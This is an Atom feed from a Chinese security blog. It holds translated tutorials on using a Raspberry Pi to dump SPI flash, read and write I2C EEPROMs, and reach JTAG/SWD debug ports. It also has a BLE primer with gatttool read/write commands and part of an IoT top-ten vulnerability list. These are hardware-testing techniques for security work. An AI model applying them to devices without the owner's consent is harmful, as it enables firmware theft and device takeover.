<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  
  <title><![CDATA[Lyon's blog]]></title>
  <subtitle><![CDATA[I hear and I forget.I see and I remember.I do and I understand.]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://www.youngroe.com//"/>
  <updated>2021-11-04T13:15:37.908Z</updated>
  <id>http://www.youngroe.com//</id>
  
  <author>
    <name><![CDATA[Lyon]]></name>
    <email><![CDATA[geemion@gmail.com]]></email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[树莓派-穷人的硬件黑客工具（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/10/20/IOT/using-rasberrypi-as-poor-mans-hardware-hacking-tool/"/>
    <id>http://www.youngroe.com/2021/10/20/IOT/using-rasberrypi-as-poor-mans-hardware-hacking-tool/</id>
    <published>2021-10-20T11:39:22.000Z</published>
    <updated>2021-11-04T13:15:37.908Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_介绍">0x00 介绍</h2><p>本文将介绍如何使用Raspberry Pi完成SPI、I2C、JTAG/SWD和JTAGenum通信，这里我将使用Raspberry Pi Zero，因为它足够便宜和小。</p>
<h2 id="0x01_设置树莓派">0x01 设置树莓派</h2><p>在本节开始之前，我建议你先开启你的树莓派并从树莓派配置选项中启用SPI、I2C、GPIO功能，你可一参考这个<a href="https://learn.sparkfun.com/tutorials/getting-started-with-the-raspberry-pi-zero-wireless/all" target="_blank" rel="external">链接</a>完成设置。</p>
<a id="more"></a>
<p>在下面Pin#针脚图中的编号是硬件位置编号而非GPIO接口编号。</p>
<div align="center"><br><img src="/img/20211103gpio.png" align><br></div><br>在树莓派中克隆这个项目代码：<a href="https://github.com/arunmagesh/raspi-sec-tool" target="_blank" rel="external">https://github.com/arunmagesh/raspi-sec-tool</a><br><br>## 0x01 SPI 串行外设接口<br>树莓派自带SPI接口，硬件测试中最常见的测试是利用SPI通信接口提取目标设备Flash闪存数据。常用的软件工具是flashrom，支持多种flash。我们将使用树莓派的bcm2385处理器/dev/spidev0.0 实现SPI Flash读取和写入。<br><br><strong>安装：</strong><br><br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install build-essential pciutils usbutils libpci-<span class="built_in">dev</span> libusb-<span class="built_in">dev</span> libftdi1 libftdi-<span class="built_in">dev</span> zlib1g-<span class="built_in">dev</span> subversion libusb-<span class="number">1.0</span>-<span class="number">0</span>-<span class="built_in">dev</span></span><br><span class="line">svn co svn:<span class="comment">//flashrom.org/flashrom/trunk flashrom</span></span><br><span class="line">cd flashrom</span><br><span class="line">make</span><br></pre></td></tr></table></figure><br><br><strong>连接：</strong><br><br>CS – 24<br>MISO – 21<br>MOSI – 19<br>CLK – 23<br>3.3v – 17<br><br><div align="center"><br><img src="/img/20211103SPI_Connect.jpg" al ign><br></div>

<p>从flash中读取数据：<br><code>flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=512 -r spi_dump.bin</code></p>
<div align="center"><br><img src="/img/20211103SPI_read.jpg" align><br></div><br>不要忘记设置spispeed=512。<br>现在你可以使用binwalk或者fmk分析提取到的固件。<br><br>## 0x02 I2C 集成电路总线连接<br><br>I2C通信类似于SPI，但它只使用两条线进行通信——SDA/SCL。每个设备都通过使用其内部 i2c 地址进行访问。这里我们以 I2C EEPROM 为例，看看我们如何读写内存。i2ctools 是 Linux 软件包的一部分，因此无需安装任何东西。<br><br><strong>连接：</strong><br>SDA – 3<br>SCL – 5<br>VCC – 1<br>VSS – A0 – A1 – A2 – A3 – WP – 6<br><br><div align="center"><br><img src="/img/20211103I2C_Connect.jpg" align><br></div>

<p>获取设备的I2C地址<br><code>i2cdetect -y 1</code></p>
<div align="center"><br><img src="/img/20211103I2C_addr.jpg" align><br></div><br>本例中地址为0x50，-y 1表明你使用了哪些i2c的引脚，本例中使用 i2c-1。<br>现在使用eeprog工具读取和写入EEPROM。<br>wget <a href="http://darkswarm.org/eeprog-0.7.6-tear5.tar.gz" target="_blank" rel="external">http://darkswarm.org/eeprog-0.7.6-tear5.tar.gz</a><br>tar -xvf eeprog-0.7.6-tear5.tar.gz eeprog-0.7.6-tear12/<br>cd eeprog-0.7.6-tear12/<br>make<br>sudo make install<br><br><strong>写入数据：</strong><br><code>echo &quot;hello&quot; | ./eeprog -f -16 -w 0 -t 5 /dev/i2c-1 0x50</code><br>-w 数据偏移选项<br>-t 写入延迟<br><div align="center"><br><img src="/img/20211103I2C_write.jpg" align><br></div>

<p><strong>读取数据：</strong><br><code>./eeprog  -x /dev/i2c-1 0x50 -16  -r 0x00:0x10</code></p>
<div align="center"><br><img src="/img/20211103I2C_read.jpg" align><br></div>

<h2 id="0x03_调试器-JTAG/SWD">0x03 调试器-JTAG/SWD</h2><p>JTAG/SWD 是允许开发人员调试微控制器或微处理器的标准接口。从攻击者的角度来看，拥有调试权限意味着完全控制了设备，攻击者可以转储设备内部数据或动态更改内存。让我们看看仅使用 Raspberry pi 访问 JTAG 和 SWD接口。我们使用开源工具 openOCD与调试器进行交互。<br><strong>连接：</strong><br>JTAG:</p>
<p>TCK – 23<br>TMS – 22<br>TDI – 19<br>TDO – 21<br>SRST – 12<br>GND – 20</p>
<p>SWD:</p>
<p>SWDIO – 18<br>SWCLK – 22<br>SRST – 12<br>GND – 14</p>
<h3 id="安装openOCD">安装openOCD</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone gi<span class="variable">t:</span>//git.code.<span class="keyword">sf</span>.net/<span class="keyword">p</span>/openocd/code openocd</span><br><span class="line"><span class="keyword">cd</span> openocd/</span><br><span class="line">./bootstrap</span><br><span class="line">./configure –enable-maintainer-<span class="built_in">mode</span> –enable-bcm2835gpio –enable-sysfsgpio</span><br><span class="line"><span class="keyword">make</span> &amp; sudo <span class="keyword">make</span> install</span><br></pre></td></tr></table></figure>
<p>耐心等待一会就回安装完成。</p>
<h3 id="JTAG">JTAG</h3><p>JTAG 的配置文件随 openOCD 包一起提供。只需带上目标 cfg文件运行它就会连接到JTAG。<br><code>openocd -f interface/raspberrypi-native.cfg -f target/stm32f4x.cfg</code></p>
<div align="center"><br><img src="/img/20211103JTAG.jpg" align><br></div><br>现在你可以使用gdb连接并调试设备。<br><br>### SWD<br><br><code>openocd -f raspberrypi_swd.cfg -f target/stm32f4x.cfg</code><br>raspberrypi_swd.cfg 位于你之前下载的 git 文件夹中。<br><div align="center"><br><img src="/img/20211103SWD.jpg" align><br></div><br>现在你可以使用gdb连接并调试设备。<br><br>### JTAGenum<br><br>在大部分设备中，很少能找到 JTAG 接口和引脚所在的位置。因此我们使用JTAGenum 工具扫描设备的所有引脚并告诉你哪些引脚是 TMS-TCK-TDI-TDO。如果你没有目标设备的开发文档，这将非常有用。<br>安装：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/cyphunk/JTAGenum</span><br><span class="line"><span class="keyword">cd</span> JTAGenum</span><br><span class="line"><span class="keyword">source</span> JTAGenum.<span class="keyword">sh</span></span><br><span class="line">scan</span><br></pre></td></tr></table></figure><br><br>需要使用3 – 5 – 7 – 11 – 13 – 15及ground引脚。<br>这将需要一些时间，因为 GPIO 非常慢。<br><div align="center"><br><img src="/img/20211103JTAG_SCAN_Done.jpg" align><br></div><br>成功找到。<br><div align="center"><br><img src="/img/20211103JTAG_SCAN_Done2.jpg" align><br></div><br>我花的时间。<br><div align="center"><br><img src="/img/20211103JTAG_SCAN_time.jpg" align><br></div>

<p>伙计们，这就是全部。如果我发现更多关于使用 Raspberry Pi 作为其他很酷的东西的信息，我会更新。<br>我们设计了一个板子，可以在没有杂乱电线的情况下执行这些操作。如果你碰巧遇到 <a href="https://twitter.com/aseemjakhar?lang=en" target="_blank" rel="external">Aseem Jakhar</a>，你可以得到一个。</p>
<div align="center"><br><img src="/img/20211103payatu.jpg" align><br></div>

<blockquote>
<p>译注：国内也有人设计了板子，淘宝有卖 <a href="https://www.muselab-tech.com/geekgong-ju-ba-shu-mei-pai-bian-cheng-duo-gong-neng-diao-shi-shao-lu-qi/" target="_blank" rel="external">https://www.muselab-tech.com/geekgong-ju-ba-shu-mei-pai-bian-cheng-duo-gong-neng-diao-shi-shao-lu-qi/</a></p>
</blockquote>
<h2 id="0x04_参考">0x04 参考</h2><ul>
<li><a href="https://github.com/cyphunk/JTAGenum" target="_blank" rel="external">https://github.com/cyphunk/JTAGenum</a></li>
<li><a href="https://github.com/synthetos/PiOCD/wiki/Using-a-Raspberry-Pi-as-a-JTAG-Dongle" target="_blank" rel="external">https://github.com/synthetos/PiOCD/wiki/Using-a-Raspberry-Pi-as-a-JTAG-Dongle</a></li>
<li><a href="http://catch22.eu/baremetal/openocd_sysfs_stm32/" target="_blank" rel="external">http://catch22.eu/baremetal/openocd_sysfs_stm32/</a></li>
<li><a href="https://movr0.com/2016/09/02/use-raspberry-pi-23-as-a-jtagswd-adapter/" target="_blank" rel="external">https://movr0.com/2016/09/02/use-raspberry-pi-23-as-a-jtagswd-adapter/</a></li>
<li><a href="https://www.richud.com/wiki/Rasberry_Pi_I2C_EEPROM_Program" target="_blank" rel="external">https://www.richud.com/wiki/Rasberry_Pi_I2C_EEPROM_Program</a></li>
<li><a href="https://libreboot.org/docs/install/rpi_setup.html" target="_blank" rel="external">https://libreboot.org/docs/install/rpi_setup.html</a></li>
</ul>
<p><em>原文链接：<a href="https://payatu.com/using-rasberrypi-as-poor-mans-hardware-hacking-tool" target="_blank" rel="external">https://payatu.com/using-rasberrypi-as-poor-mans-hardware-hacking-tool</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_介绍">0x00 介绍</h2><p>本文将介绍如何使用Raspberry Pi完成SPI、I2C、JTAG/SWD和JTAGenum通信，这里我将使用Raspberry Pi Zero，因为它足够便宜和小。</p>
<h2 id="0x01_设置树莓派">0x01 设置树莓派</h2><p>在本节开始之前，我建议你先开启你的树莓派并从树莓派配置选项中启用SPI、I2C、GPIO功能，你可一参考这个<a href="https://learn.sparkfun.com/tutorials/getting-started-with-the-raspberry-pi-zero-wireless/all">链接</a>完成设置。</p>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-4.低功耗蓝牙BLE（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/22/IOT/iot-security-part-4-bluetooth-low-energy-101/"/>
    <id>http://www.youngroe.com/2021/09/22/IOT/iot-security-part-4-bluetooth-low-energy-101/</id>
    <published>2021-09-22T12:50:22.000Z</published>
    <updated>2021-11-06T15:28:21.547Z</updated>
    <content type="html"><![CDATA[<p>如果您还没有通读我们的 IoT 安全博客系列的第 1 部分到第 3 部分，我建议您先阅读它们，除非您已经熟悉 IoT 的基础知识。上一篇博客的链接——<a href="/2021/09/22/IOT/iot-security-part-3-101-iot-top-ten-vulnerabilities/">物联网安全——第 3 部分</a>。<br>蓝牙一直是一个流行词，因为人们希望他们的所有设备都是智能的，这基本上意味着您可以跨设备控制事物而无需携带电线。蓝牙已经进入市场十多年了。如果您是千禧一代，您会使用那些带有蓝牙功能的经典诺基亚手机。蓝牙是由爱立信发明的，其他厂商也开始使用蓝牙。不久之后，所有主要供应商都创建了一个名为<a href="https://en.wikipedia.org/wiki/Bluetooth_Special_Interest_Group" target="_blank" rel="external">蓝牙特别兴趣小组- SIG的联盟</a>，该联盟管理标准应该如何以及不同版本之间的互操作性。<br>我们不打算谈论蓝牙。蓝牙本身就是一个庞大的协议栈，它们的规范大约有2000 多页。在本博客中，我将仅介绍更为著名的 BLE 蓝牙低功耗。<br><a id="more"></a></p>
<p>随着万物互联时代的到来，随之而来的是能量和资源的问题。正如我之前提到的，蓝牙是一个巨大的协议栈。在像健身手环这样的终端设备中实施它需要更多的能量和资源。因此，在蓝牙 4.0 标准中，他们引入了一种称为 Low energy 的技术，专门针对在内存和功率受限的设备上运行的物联网和智能设备。</p>
<div align="center"><br><img src="/img/2021092150941367.jpg" align><br></div>

<p>Bluetooth SIG 开始将该标准作为 <a href="https://www.laptopmag.com/articles/just-what-is-bluetooth-4-0-anyway" target="_blank" rel="external">Bluetooth Smart</a>进行销售。它有两个组件，Bluetooth Smart设备是只有蓝牙低功耗组件的终端设备，Bluetooth Ready是能够同时执行Bluetooth LE 和 EDR-Bluetooth经典组件的设备，这可能是您的中心设备，如手机或笔记本电脑。<br>现在让我们来看看蓝牙规范的技术细节</p>
<div align="center"><br><img src="/img/202109212961815527.gif" align><br></div><br>来源：<a href="https://archive.eetindia.co.in/www.eetindia.co.in/STATIC/ARTICLE_IMAGES/201312/EEIOL_2013DEC13_RFD_NET_TA_01Tab1.gif" target="_blank" rel="external">https://archive.eetindia.co.in/www.eetindia.co.in/STATIC/ARTICLE_IMAGES/201312/EEIOL_2013DEC13_RFD_NET_TA_01Tab1.gif</a><br><br>该表本身将使您更好地了解规格、范围和带宽已减少以承受低功耗和低资源。<br>正如我之前提到的，LE 有两种不同类型的设备。<br><br><a href="https://www.digikey.com/Web%20Export/Supplier%20Content/Laird_776/PDF/laird-wireless-bluetooth-smart-ready.pdf" target="_blank" rel="external">Bluetooth Smart Ready</a>- 这是电池供电和高资源的中央设备，能够运行所有蓝牙协议。它们是您的笔记本电脑和手机。<br><br><div align="center"><br><img src="/img/3391617601.jpg" align><br></div>

<p><a href="https://www.digikey.com/Web%20Export/Supplier%20Content/Laird_776/PDF/laird-wireless-bluetooth-smart-ready.pdf" target="_blank" rel="external">Bluetooth Smart</a>– 它们是您的终端设备，如健身追踪器、行李追踪器或智能假阳具。他们不必运行整个堆栈，他们需要节省电力和资源。它们仅运行 Bluetooth LE 服务器。它们是中央设备可以连接的外围设备。</p>
<div align="center"><br><img src="/img/170392843.jpg" align><br></div>

<p>蓝牙和 LE 堆栈详细信息超出了本文的范围。<br>但是我们将关注的两个重要组件是 GAT 和 GAPP，它们负责 BLE 服务的运行。</p>
<div align="center"><br><img src="/img/Bluetooth_stack.jpg" align><br></div>

<h2 id="Generic_Access_Profile_(GAP)_通用访问配置文件">Generic Access Profile (GAP) 通用访问配置文件</h2><p><a href="https://www.bluetooth.com/specifications/assigned-numbers/generic-access-profile" target="_blank" rel="external">GAP</a>定义了您与中央和外围设备的通信和连接应该如何工作。</p>
<div align="center"><br><img src="/img/Bluetooth_GAP.jpg" align><br></div>

<h2 id="Generic_Attribute_(GATT)通用属性_(GATT)">Generic Attribute (GATT)通用属性 (GATT)</h2><p><a href="https://www.bluetooth.com/specifications/gatt/generic-attributes-overview" target="_blank" rel="external">GATT</a>就像一个管理您的数据需要如何处理的服务器。<br>您的Bluetooth LE 设备按照服务器-客户端原理工作。在这里，您的终端设备/外围设备充当运行 GATT 服务器的服务器，而您的中央设备充当客户端。因此，您的最终应用程序或工具连接到 GATT 服务器并从设备请求数据。<br>在您的 GATT 服务器内。有三个组成部分。</p>
<ul>
<li><ol>
<li><a href="http://dev.ti.com/tirex/content/simplelink_cc2640r2_sdk_1_40_00_45/docs/blestack/ble_user_guide/html/ble-stack-3.x/gatt.html" target="_blank" rel="external">Profile</a> – Bluetooth SIG 定义，它可以基于设备的类型，可以是血压设备或温度传感器，也可以是任何最常用的具有互操作性优势的设备。</li>
</ol>
</li>
<li><ol start="2">
<li><a href="https://www.bluetooth.com/specifications/gatt/services" target="_blank" rel="external">Services</a> - 每个设备内部都有多个参数。假设设备可以有名称、固件版本、OTA 功能、设备操作。它们被分组到称为服务的特定数据集。</li>
</ol>
</li>
<li><ol start="3">
<li><a href="https://www.bluetooth.com/specifications/gatt/characteristics" target="_blank" rel="external">Characteristics</a> - 在您的服务中放置您的数据。它可以是 16 位Bluetooth SIG 派生特征或特定于供应商的 128 位特征。</li>
</ol>
</li>
</ul>
<p>简而言之，service就像一个文件夹，characteristics是保存数据的文件。</p>
<div align="center"><br><img src="/img/GATT.png" align><br></div>

<p>现在我们了解了什么是低功耗蓝牙及其工作原理的基础知识。让我们来看看有关如何访问 BLE 设备的一些工具和方法。<br>如果您使用的是 Windows，我会认真建议您使用 Ubuntu，因为它带有所有必要的工具来访问 ble 设备并从亚马逊获得那些便宜的蓝牙 4.0 模块。（有些笔记本电脑不附带它。）</p>
<h3 id="连接蓝牙适配器：">连接蓝牙适配器：</h3><ul>
<li><ol>
<li>将蓝牙 USB 模块连接到笔记本电脑的空闲 USB 端口。（无需从主机安装任何驱动程序）。</li>
</ol>
</li>
<li><ol start="2">
<li>连接后，打开终端并输入”sudo hciconfig “， 您应该能够看到此窗口，该窗口为您提供 mac 地址（蓝牙USB模块），并且应该显示 UP and RUNNING。</li>
</ol>
</li>
<li><ol start="3">
<li>如果您遇到任何问题，请通过”sudo hciconfig hci0 reset”重新启动蓝牙接口→这会很方便。<div align="center"><br><img src="/img/connect_ble.png" align><br></div>

</li>
</ol>
</li>
</ul>
<h3 id="扫描蓝牙设备">扫描蓝牙设备</h3><ul>
<li><ol>
<li>成功将蓝牙适配器连接到机器后</li>
</ol>
</li>
<li><ol start="2">
<li>您现在可以使用”sudo hcitool lescan”扫描您周围的所有 ble 设备<div align="center"><br><img src="/img/scan_ble.png" align><br></div>
</li>
</ol>
</li>
<li><ol start="3">
<li>您将看到带有名称和 MAC 地址的设备列表。</li>
</ol>
</li>
<li><ol start="4">
<li>通过关闭和打开设备并找出差异来找出设备的 mac。</li>
</ol>
</li>
<li><ol start="5">
<li>现在获取有关该设备的更多信息。执行”sudo hcitool leinfo –random <mac>“ –random 取决于类型寻址。</mac></li>
</ol>
</li>
</ul>
<div align="center"><br><img src="/img/scan_ble.png" align><br></div>

<ul>
<li><ol start="6">
<li>您将获得基本信息，例如蓝牙设备的制造商。</li>
</ol>
</li>
</ul>
<h3 id="读取和写入数据">读取和写入数据</h3><ul>
<li>获得设备的MAC地址后。将其保存在一个文件中。它会很有用。</li>
<li>连接到智能设备的 GATT 服务器。我们使用名为 gatttool 的工具。</li>
<li>使用这个命令”sudo gatttool -I -b <mac> -t random “你会得到一个像这样的CLI并输入”connect”。<div align="center"><br><img src="/img/connected_ble.png" align><br></div></mac></li>
<li>现在您可以通过使用”primary”、”characteristics”和”char-desc”查看设备中运行的所有UUID来查看设备上运行的特性和服务。<div align="center"><br><img src="/img/bluetooth_primary.png" align><br></div>

</li>
</ul>
<div align="center"><br><img src="/img/bluetooth_characteristics.png" align><br></div>

<ul>
<li>现在您可以使用”char-read-hnd <handle> “和” char-write-req <handle> <data> “读取和写入这些句柄来读取和写入它。<div align="center"><br><img src="/img/4150880507.png" align><br></div>

</data></handle></handle></li>
</ul>
<div align="center"><br><img src="/img/Selection_278.png" align><br></div>

<ul>
<li>这里的字符属性为您提供了句柄的权限，如读取、写入、通知、指示。<div align="center"><br><img src="/img/2634211564.png" align><br></div>

</li>
</ul>
<div align="center"><br><img src="/img/177460243.png" align><br></div>

<ul>
<li>您也可以通过将“01”写入句柄来启用通知</li>
</ul>
<div align="center"><br><img src="/img/182114208.png" align><br></div>

<p>您可以查看我们的<a href="https://payatu.com/blog/Arun-Magesh/smartmassager_re" target="_blank" rel="external">其他博客</a>，了解如何逆向智能按摩器的蓝牙通信。</p>
<h2 id="参考：">参考：</h2><p><a href="https://www.nordicsemi.com/eng/News/ULP-Wireless-Update/A-short-history-of-Bluetooth" target="_blank" rel="external">https://www.nordicsemi.com/eng/News/ULP-Wireless-Update/A-short-history-of-Bluetooth</a><br><a href="https://www.bluetooth.com/specifications/gatt/generic-attributes-overview" target="_blank" rel="external">https://www.bluetooth.com/specifications/gatt/generic-attributes-overview</a><br><a href="https://www.bluetooth.com/specifications" target="_blank" rel="external">https://www.bluetooth.com/specifications</a><br><a href="https://learn.adafruit.com/introduction-to-bluetooth-low-energy/gatt" target="_blank" rel="external">https://learn.adafruit.com/introduction-to-bluetooth-low-energy/gatt</a><br><a href="https://www.oreilly.com/library/view/getting-started-with/9781491900550/ch01.html" target="_blank" rel="external">https://www.oreilly.com/library/view/getting-started-with/9781491900550/ch01.html</a><br><a href="https://en.wikipedia.org/wiki/Bluetooth_Low_Energy" target="_blank" rel="external">https://en.wikipedia.org/wiki/Bluetooth_Low_Energy</a><br><a href="https://www.jaredwolff.com/blog/get-started-with-bluetooth-low-energy/" target="_blank" rel="external">https://www.jaredwolff.com/blog/get-started-with-bluetooth-low-energy/</a><br><a href="http://object-network.blogspot.com/2014/01/scanning-ble-adverts-from-linux.html" target="_blank" rel="external">http://object-network.blogspot.com/2014/01/scanning-ble-adverts-from-linux.html</a><br><a href="https://elinux.org/images/3/32/Doing_Bluetooth_Low_Energy_on_Linux.pdf" target="_blank" rel="external">https://elinux.org/images/3/32/Doing_Bluetooth_Low_Energy_on_Linux.pdf</a><br><a href="https://www.digikey.com/Web%20Export/Supplier%20Content/Laird_776/PDF/laird-wireless-bluetooth-smart-ready.pdf" target="_blank" rel="external">https://www.digikey.com/Web%20Export/Supplier%20Content/Laird_776/PDF/laird-wireless-bluetooth-smart-ready.pdf</a></p>
<p><em>原文链接：<a href="https://payatu.com/blog/Arun-Magesh/iot-security-part-4-bluetooth-low-energy-101" target="_blank" rel="external">https://payatu.com/blog/Arun-Magesh/iot-security-part-4-bluetooth-low-energy-101</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>如果您还没有通读我们的 IoT 安全博客系列的第 1 部分到第 3 部分，我建议您先阅读它们，除非您已经熟悉 IoT 的基础知识。上一篇博客的链接——<a href="/2021/09/22/IOT/iot-security-part-3-101-iot-top-ten-vulnerabilities/">物联网安全——第 3 部分</a>。<br>蓝牙一直是一个流行词，因为人们希望他们的所有设备都是智能的，这基本上意味着您可以跨设备控制事物而无需携带电线。蓝牙已经进入市场十多年了。如果您是千禧一代，您会使用那些带有蓝牙功能的经典诺基亚手机。蓝牙是由爱立信发明的，其他厂商也开始使用蓝牙。不久之后，所有主要供应商都创建了一个名为<a href="https://en.wikipedia.org/wiki/Bluetooth_Special_Interest_Group">蓝牙特别兴趣小组- SIG的联盟</a>，该联盟管理标准应该如何以及不同版本之间的互操作性。<br>我们不打算谈论蓝牙。蓝牙本身就是一个庞大的协议栈，它们的规范大约有2000 多页。在本博客中，我将仅介绍更为著名的 BLE 蓝牙低功耗。<br>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-3.物联网10大安全漏洞（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/22/IOT/iot-security-part-3-101-iot-top-ten-vulnerabilities/"/>
    <id>http://www.youngroe.com/2021/09/22/IOT/iot-security-part-3-101-iot-top-ten-vulnerabilities/</id>
    <published>2021-09-22T11:50:22.000Z</published>
    <updated>2021-11-06T09:27:15.956Z</updated>
    <content type="html"><![CDATA[<p>如果您还没有阅读我们的 IoT 安全博客系列的第 1 部分和第 2 部分，我建议您先阅读它们，除非您已经熟悉基础知识并且只想阅读 IoT 十大漏洞。</p>
<p>说到十大漏洞，我们首先想到的是OWASP。为什么不呢，毕竟他们是定义 Web 和移动应用 10 大漏洞的先驱。我是 OWASP 的粉丝，这仅仅是因为 OWASP 社区多年来为定义应用程序安全问题、为行业提供免费教程和开源工具以减轻风险和漏洞所做的工作。您很有可能没有听说过 OWASP 或从他们的网站上阅读过内容，但是如果您没有，我强烈建议您访问他们的网站  <a href="https://www.owasp.org" target="_blank" rel="external">https://www.owasp.org</a></p>
<p>OWASP 还启动了物联网安全计划，社区定义了物联网攻击面和物联网前 10 大漏洞，以及Web和移动设备10大漏洞。他们的方向是正确的，很快它就会成为学习物联网安全内容的绝佳场所。</p>
<a id="more"></a>
<p>OWASP网站物联网安全相关内容如下：</p>
<ul>
<li><ol>
<li>OWASP Web Top 10项目： – <a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" target="_blank" rel="external">https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project</a></li>
</ol>
</li>
<li><ol start="2">
<li>OWASP Mobile Top 10项目：<a href="https://www.owasp.org/index.php/OWASP_Mobile_Security_Project" target="_blank" rel="external">https://www.owasp.org/index.php/OWASP_Mobile_Security_Project</a></li>
</ol>
</li>
<li><ol start="3">
<li>OWASP物联网项目：https : //<a href="http://www.owasp.org/index.php/OWASP_Internet_of_Things_Project" target="_blank" rel="external">www.owasp.org/index.php/OWASP_Internet_of_Things_Project</a></li>
</ol>
</li>
<li>a. OWASP 物联网攻击面：https : //<a href="http://www.owasp.org/index.php/OWASP_Internet_of_Things_Project#tab=IoT_Attack_Surface_Areas" target="_blank" rel="external">www.owasp.org/index.php/OWASP_Internet_of_Things_Project#tab=IoT_Attack_Surface_Areas</a></li>
<li>b. OWASP 物联网十大漏洞：https ://<a href="http://www.owasp.org/index.php/Top_10_IoT_Vulnerabilities_" target="_blank" rel="external">www.owasp.org/index.php/Top_10_IoT_Vulnerabilities_</a>(2014 )</li>
</ul>
<h2 id="OWASP物联网十大漏洞">OWASP物联网十大漏洞</h2><p>OWASP 最近定义了物联网中的前 10 个漏洞。它非常全面，我建议您阅读它们并了解物联网生态系统的威胁和问题是什么。作为作业，您可以将其映射到我们在上一篇博文中定义的攻击面。OWASP IoT 十大漏洞（根据<a href="https://www.owasp.org/index.php/Top_IoT_Vulnerabilities）：" target="_blank" rel="external">https://www.owasp.org/index.php/Top_IoT_Vulnerabilities）：</a></p>
<ul>
<li>I1.不安全的 Web 界面</li>
<li>I2.身份验证/授权不足</li>
<li>I3.不安全的网络服务</li>
<li>I4.缺乏传输加密/完整性验证</li>
<li>I5.隐私问题</li>
<li>I6.不安全的云接口</li>
<li>I7.不安全的移动接口</li>
<li>I8.安全可配置性不足</li>
<li>I9.不安全的软件/固件</li>
<li>I10.物理安全性差</li>
</ul>
<p>我们不会深入研究前十名中每个项目的详细信息。可以在 OWASP 链接（上面给出）上找到详细信息。相反，我们将根据我们发现的问题或 Internet 上发布的问题的经验来优化前十名。</p>
<h2 id="Payatu物联网十大漏洞2018">Payatu物联网十大漏洞2018</h2><p><em>免责声明：请注意，我们的目标不是试图超越 OWASP 前十名，这些人做得很好。向 OWASP 团队致敬！这是一项基于我们经验的练习，更多地关注值得关注的硬件和新的物联网技术。</em></p>
<p>我们将继续维护和更新 Payatu IoT Top 10 漏洞。如果您有任何建议，请随时给我们发送电子邮件（info a..t payatu DOT com）。我们将 Web 和云合二为一，原因是并非所有传感器或物联网设备都具有 Web 界面，而云是生态系统的重要组成部分，从攻击面的角度来看，它主要是基于 Web API 的。此外，一些漏洞可能适用于多个组件，例如硬编码适用于设备和移动应用程序。<br>我们将定义对物联网安全市场和产品造成影响的 10 大物联网漏洞。我们将解释以下所有物联网漏洞，以了解基本的安全问题。</p>
<p><div align="center"><br><img src="/img/20210921payatu_iot_top_ten.png" align><br></div></p>
<ul>
<li>P1.硬编码敏感信息</li>
<li>P2.启用硬件调试端口</li>
<li>P3.不安全的固件</li>
<li>P4.不安全的数据存储</li>
<li>P5.认证不足</li>
<li>P6. 不安全的通信</li>
<li>P7. 不安全的配置</li>
<li>P8.数据输入过滤不足</li>
<li>P9. 不安全的移动接口</li>
<li>P10.不安全的云/网络界面</li>
</ul>
<h3 id="P1-_硬编码敏感信息">P1. 硬编码敏感信息</h3><p>由于开发人员在程序中对静态数据进行硬编码，因此在开发过程中对信息进行硬编码是常见的做法。但是，当敏感信息被硬编码时就会出现问题。很可能将敏感信息硬编码在固件以及移动应用程序或胖客户端中。问题是它对于产品的所有实例保持不变，可用于攻击部署在现场的任何产品实例。硬编码的敏感信息的一些示例：</p>
<ul>
<li><ol>
<li>凭证信息 - 包含设备服务、云服务的凭据信息。</li>
</ol>
</li>
<li><ol start="2">
<li>加密密钥 - 非对称加密私钥、对称加密密钥</li>
</ol>
</li>
<li><ol start="3">
<li>证书 - 客户端证书等</li>
</ol>
</li>
<li><ol start="4">
<li>API 密钥 - 私有/付费 API</li>
</ol>
</li>
<li><ol start="5">
<li>URLs – 开发、固件相关、用户相关、后端等。</li>
</ol>
</li>
<li><ol start="6">
<li>配置信息</li>
</ol>
</li>
</ul>
<h3 id="P2-_启用硬件调试端口">P2. 启用硬件调试端口</h3><p>设备硬件可能会打开调试端口以与系统交互。简单来说，它是 PCB 上的一组引脚，它们连接到微控制器/微处理器引脚，您可以使用客户端软件连接到这些引脚，通过硬件通信协议进行通信，允许您与系统进行交互。交互和特权级别取决于协议类型及其用法。例如，可能有 UART 接口的引脚输出，它可以让您访问高级软件/应用程序，即Shell、记录器输出等。您还可以使用以下协议与微控制器进行低级交互JTAG、SWD 等，这些使您可以直接控制微控制器，以便您可以测试和分析微控制器引脚值，读/写内部闪存，读/写寄存器值，调试操作系统/基础固件代码等等。如果设备上启用了这些端口/引脚，攻击者可以劫持设备和/或从设备中提取敏感信息，包括固件和数据。这些端口通常用于对生产设备中的问题进行故障排除/调试。</p>
